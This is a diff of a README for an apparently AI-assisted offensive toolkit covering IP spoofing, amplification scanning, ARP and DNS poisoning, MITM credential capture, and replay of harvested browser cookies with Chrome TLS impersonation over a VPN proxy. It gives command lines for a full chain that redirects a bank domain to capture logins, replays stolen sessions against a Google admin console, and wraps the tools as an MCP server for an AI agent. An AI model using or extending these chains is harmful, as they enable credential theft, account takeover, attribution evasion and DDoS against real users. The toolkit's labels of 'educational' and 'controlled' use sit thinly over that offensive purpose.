@@ -1,10 +1,50 @@
-# ClaudeCodeIPTool
+# ClaudeCodeIPTool v3.0
 
-Three functional tools demonstrating IP spoofing attack primitives and defenses.
+Complete IP spoofing, session replay, and proxy routing suite for VDT (Vulnerability Discovery Testing). Ten functional tools covering reconnaissance, Chrome TLS impersonation, SOCKS5 proxy routing, MITM attacks, and defense monitoring.
 
 ## Tools
 
-### 1. `spoofer.py` - Core IP Spoofing Techniques
+### Session Routing (New in v3.0)
+
+#### 9. `session_replay.py` - Cookie-Based Session Replay with Chrome TLS Impersonation
+**KEY TOOL** for replaying captured browser sessions with proper TLS fingerprinting:
+- Uses `curl_cffi` to mimic Chrome's exact JA3/JA3s/ALPN fingerprint
+- Reads Netscape-format cookie files (from browser exports or VDT harvests)
+- Bypasses Python `requests` TLS fingerprint detection (Google, Cloudflare, etc.)
+- Three modes: `probe` (single URL), `enumerate` (bulk targets), `export` (domain cookie dump)
+
+```bash
+pip install curl_cffi
+python3 session_replay.py probe --cookies cookies.txt --url https://admin.google.com/
+python3 session_replay.py enumerate --cookies cookies.txt --domains targets.txt --output results.json
+python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
+```
+
+**Status**: ✓ Functional (requires `pip install curl_cffi`)
+
+#### 10. `windscribe_socks.py` - Windscribe SOCKS5 Proxy + Chrome TLS Chain
+**ROUTING TOOL** for channeling sessions through VPN exit IPs:
+- Routes `curl_cffi` sessions through Windscribe's SOCKS5 proxy (localhost:1080)
+- Shows exit IP and ASN before/after proxy to confirm routing change
+- Full chain mode: proxy + TLS impersonation + session cookies in one command
+- `find-location` helps identify exits that match a target ASN
+
+```bash
+# Check proxy status + exit IP
+python3 windscribe_socks.py status
+
+# Full chain: Windscribe SOCKS5 + Chrome TLS + session cookies
+python3 windscribe_socks.py chain --cookies cookies.txt --url https://admin.google.com/ --output admin.html
+
+# Probe without cookies
+python3 windscribe_socks.py probe https://ipinfo.io/json
+```
+
+**Status**: ✓ Functional (requires Windscribe connected + `pip install curl_cffi`)
+
+### Offensive Tools
+
+#### 1. `spoofer.py` - Core IP Spoofing Techniques
 Educational demonstrations of 5 spoofing primitives:
 - TCP SYN flood with forged source
 - UDP amplification (reflection attacks)
@@ -14,22 +54,67 @@ Educational demonstrations of 5 spoofing primitives:
 
 **Status**: ✓ Functional (requires root/sudo)
 
-### 2. `spoof-scanner.py` - Reflection/Amplification Reconnaissance
+#### 2. `spoof-scanner.py` - Reflection/Amplification Reconnaissance
 **WORKING TOOL** for identifying DDoS amplification vectors:
-- Scans 8 reflection services (DNS, NTP, SNMP, Memcached, etc.)
-- Reports amplification factors (1 byte → 51,000 bytes for Memcached)
+- Scans 8 reflection services (DNS, NTP, SNMP, Memcached, CharGen, SSDP, LDAP, HTTP)
+- Reports amplification factors (Memcached 51,000x, NTP 556x, CharGen 358x)
 - Tests BCP 38 / uRPF anti-spoofing controls
 - Export to JSON for further analysis
 
 **Status**: ✓ Functional (tested against controlled targets)
 
-### 3. `ghostport.py` - Stealth Port Scanner via Spoofing
+#### 3. `ghostport.py` - Stealth Port Scanner via Spoofing
 **NOVEL TECHNIQUE** - port scanning without your IP touching target:
 - 4 inference methods: passive sniffing, timing side-channel, TTL differential, covert channels
 - Target logs show victim IP, not attacker
 - Demonstrates attribution evasion
 
 **Status**: ✓ Functional (requires 3-host setup or sniffing capability)
+
+#### 4. `arp-spoof.py` - Bidirectional IP Spoofing (Layer 2)
+**TRUE BIDIRECTIONAL SPOOFING** via ARP cache poisoning:
+- Target thinks your MAC address belongs to spoofed IP
+- Receive responses bidirectionally (Layer 2 only, same LAN)
+- MITM traffic interception mode
+- Auto IP forwarding enable/disable
+
+**Status**: ✓ Functional (requires Layer 2 adjacency)
+
+#### 5. `dns-spoof.py` - DNS Cache Poisoning
+Intercept DNS queries and return forged responses:
+- Redirect specific domains or all traffic (wildcard)
+- Phishing and MITM attack enabler
+- Real-time DNS injection
+
+**Status**: ✓ Functional (requires ARP spoofing active)
+
+#### 6. `lan-discovery.py` - Automated Network Reconnaissance
+Discover and profile attack targets:
+- ARP scan for host discovery
+- Port scanning on common services
+- OS fingerprinting via TTL analysis
+- Attack target suggestions
+
+**Status**: ✓ Functional (automated reconnaissance)
+
+#### 7. `mitm-suite.py` - Credential Capture & Session Hijacking
+Complete MITM attack toolkit:
+- HTTP Basic Auth credential extraction
+- POST form credential capture (username/password)
+- Session cookie hijacking
+- SSL strip opportunity detection
+
+**Status**: ✓ Functional (requires ARP + DNS spoofing active)
+
+### Defensive Tools
+
+#### 8. `defense-detector.py` - Attack Detection
+Defend YOUR network against spoofing attacks:
+- ARP spoof detection (MAC change monitoring)
+- DNS spoof detection (IP inconsistency tracking)
+- Identifies attacker MAC addresses for blocking
+
+**Status**: ✓ Functional (monitors for active attacks)
 
 ---
 
@@ -50,36 +135,79 @@ sudo python3 spoofer.py demo 127.0.0.1
 
 ## Usage Examples
 
-### Spoof-Scanner (Reflection/Amplification)
+### Full MITM Attack Chain
+
+Complete attack from network discovery → credential capture:
 
 ```bash
-# Scan single IP for all reflection services
-sudo python3 spoof-scanner.py scan --targets 8.8.8.8 --spoof 1.1.1.1
+# 1. Discover targets on network
+sudo python3 lan-discovery.py --suggest
 
-# Scan specific services only
-sudo python3 spoof-scanner.py scan --targets ips.txt --spoof 1.1.1.1 --services dns,ntp,memcached
+# Output shows high-value targets with attack suggestions
 
-# Test BCP 38 anti-spoofing
-sudo python3 spoof-scanner.py test-bcp38 192.168.1.1 --victim 8.8.8.8
+# 2. ARP spoof target (make traffic route through you)
+sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1 --intercept
 
-# Export results
-sudo python3 spoof-scanner.py scan --targets ips.txt --spoof 1.1.1.1 --output results.json
+# 3. DNS spoofing (redirect domains)
+# In separate terminal:
+sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50
+
+# 4. Credential capture (watch traffic)
+# In third terminal:
+sudo python3 mitm-suite.py -v
+
+# Target visits bank.com → gets redirected to your IP → credentials captured
 ```
 
-### GhostPort (Stealth Port Scan)
+### Individual Tools
 
+**Network Discovery:**
 ```bash
-# Passive method (requires sniffing)
+sudo python3 lan-discovery.py --full --output lan-hosts.json
+```
+
+**ARP Spoofing (Bidirectional):**
+```bash
+# Basic spoofing
+sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8
+
+# With traffic monitoring
+sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8 --intercept
+```
+
+**DNS Spoofing:**
+```bash
+# Redirect single domain
+sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50
+
+# Redirect ALL domains (wildcard)
+sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
+```
+
+**MITM Credential Capture:**
+```bash
+sudo python3 mitm-suite.py -v
+# Captures: HTTP Basic Auth, POST forms, cookies, SSL strip opportunities
+```
+
+**Reflection Scan:**
+```bash
+sudo python3 spoof-scanner.py scan --targets 8.8.8.8 --spoof 1.1.1.1
+sudo python3 spoof-scanner.py test-bcp38 192.168.1.1 --victim 8.8.8.8
+```
+
+**GhostPort Scan:**
+```bash
 sudo python3 ghostport.py scan 192.168.1.100 --victim 8.8.8.8 --ports 80,443,22 --method passive
+```
 
-# Timing inference (no sniffing needed)
-sudo python3 ghostport.py scan 192.168.1.100 --victim 8.8.8.8 --ports 80,443 --method timing
+**Defense Detection:**
+```bash
+# Detect ARP spoofing on YOUR network
+sudo python3 defense-detector.py arp -v
 
-# Scan port range
-sudo python3 ghostport.py scan 192.168.1.100 --victim 8.8.8.8 --ports 1-1024 --method passive
-
-# Test if your network allows spoofing
-sudo python3 ghostport.py test-spoof 192.168.1.1 --spoof 8.8.8.8
+# Detect DNS spoofing
+sudo python3 defense-detector.py dns -v
 ```
 
 ---
@@ -238,65 +366,57 @@ Core concepts from VDT book corpus:
 
 ---
 
-## TODO: Claude Code MCP Integration
+## Claude Code MCP Integration
 
-Create MCP server for Claude Code integration:
+MCP server provides natural language interface to toolkit:
 
-```python
-# ~/.claude/mcp-servers/spoof-toolkit/server.py
+```bash
+# Install (already configured at ~/.claude/mcp-servers/ClaudeCodeIPTool/)
+# See INSTALL_MCP.md for setup details
 
-tools = [
-    "spoof_reflection_scan",    # Wrapper for spoof-scanner.py
-    "spoof_ghostport_scan",     # Wrapper for ghostport.py
-    "spoof_test_bcp38",         # Test spoofing capability
-    "spoof_detect_ttl"          # TTL analysis for spoof detection
-]
+# Available MCP tools:
+# - spoof_reflection_scan: Scan for amplification vulnerabilities
+# - spoof_ghostport_scan: Stealth port scanning
+# - spoof_test_bcp38: Test network spoofing capability
+# - spoof_detect_ttl: TTL-based spoof detection
+# - spoof_list_services: Enumerate reflection services
 ```
 
-**Status**: Pending implementation
+**Status**: ✓ Functional (see `~/.claude/mcp-servers/ClaudeCodeIPTool/server.py`)
 
 ---
 
-## NEW: ARP Spoofing Module (Bidirectional Capability)
+## Attack Chain Orchestration
 
-### 4. `arp-spoof.py` - ARP Cache Poisoning for Bidirectional Spoofing
+### Complete MITM Attack (Controlled Environment)
 
-**WORKING TOOL** for bidirectional IP spoofing via ARP cache poisoning.
-
-**Use Case:**
-- Make target think you ARE 75.142.10.8 (not just packets FROM it)
-- Target sends responses to YOUR MAC address
-- Bidirectional communication achieved
-
-**How It Works:**
 ```
-Normal ARP:
-Target asks: "Who has 75.142.10.8?"
-Real 75.142.10.8: "I do! My MAC is AA:BB:CC:DD:EE:FF"
+1. Reconnaissance                → lan-discovery.py
+   └─ Discover hosts, OS, ports  → Target list with attack suggestions
 
-ARP Spoofing:
-You send: "75.142.10.8 is at YOUR_MAC_ADDRESS" (lie)
-Target updates cache: 75.142.10.8 → YOUR_MAC
-Target sends packets for 75.142.10.8 to YOU
+2. Establish MITM Position       → arp-spoof.py
+   └─ Poison ARP cache           → Traffic flows through attacker
+
+3. Traffic Redirection           → dns-spoof.py
+   └─ Intercept DNS queries      → Redirect domains to attacker
+
+4. Credential Harvesting         → mitm-suite.py
+   └─ Capture HTTP traffic       → Extract credentials/cookies
+
+5. Defense Monitoring            → defense-detector.py
+   └─ Run on victim network      → Detects attack in progress
 ```
 
-**Requirements:**
-- Same Layer 2 network as target (LAN, not Internet)
-- Root/sudo for raw sockets
-- IP forwarding enabled (auto-enabled by tool)
+### One-Way vs Bidirectional
 
-**Usage:**
-```bash
-# Basic ARP spoofing
-sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8
+| Tool | Type | Range | Use Case |
+|------|------|-------|----------|
+| spoofer.py | One-way | Internet-wide | Reflection attacks, attribution evasion |
+| spoof-scanner.py | One-way | Internet-wide | Amplification vector discovery |
+| ghostport.py | One-way | Internet-wide | Stealth port scanning |
+| arp-spoof.py | **Bidirectional** | Same LAN only | MITM, session hijacking |
+| dns-spoof.py | **Bidirectional** | Same LAN only | Traffic redirection |
+| mitm-suite.py | **Bidirectional** | Same LAN only | Credential capture |
 
-# With traffic interception (see packets)
-sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8 --intercept
-
-# Restore ARP cache when done
-sudo python3 arp-spoof.py restore 192.168.1.100 --spoof-ip 75.142.10.8
-```
-
-**Status**: ✓ Functional (requires same network as target)
-
-**Critical Limitation:** Only works if target is on SAME LAN (Layer 2). Cannot work across Internet.
+**One-way**: Send packets with forged source, no responses received (responses go to real spoofed IP)  
+**Bidirectional**: Layer 2 manipulation, receive responses (target thinks you ARE the spoofed IP)
